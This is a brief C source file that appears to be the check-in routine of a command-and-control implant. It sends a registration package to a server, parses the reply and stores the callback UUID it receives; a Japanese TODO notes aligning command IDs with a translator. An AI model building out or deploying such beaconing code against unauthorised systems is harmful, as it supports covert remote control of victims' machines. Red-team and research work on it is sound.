#include "checkin.h"

// TODO:commandIDをtranlaterと一致させる。

//comandID =
/*
#define CMD_CHECKIN     0x01
#define CMD_GET_TASKING 0x04
#define CMD_RESPONSE    0x05
*/

BOOL setupCallbackuuid(PCommand cmd, PCONFIG_CORN corn){
    
    memcpy(corn->callBackuuid, cmd->args[0], 36);

    return TRUE;
}


BOOL sendCheckin(PCONFIG_CORN corn){
    PPackage Checkin = newPackage(TRUE, checkin);

    PParser response = sendAndReceive(Checkin->buffer, Checkin->size);

    freePackage(Checkin);

    if(!response){
        return FALSE;
    }

    PCommand cmd = tlvReadField(response);
    setupCallbackuuid(cmd, corn);

    freeParser(response);
    freeCommand(cmd);

    return TRUE;
}

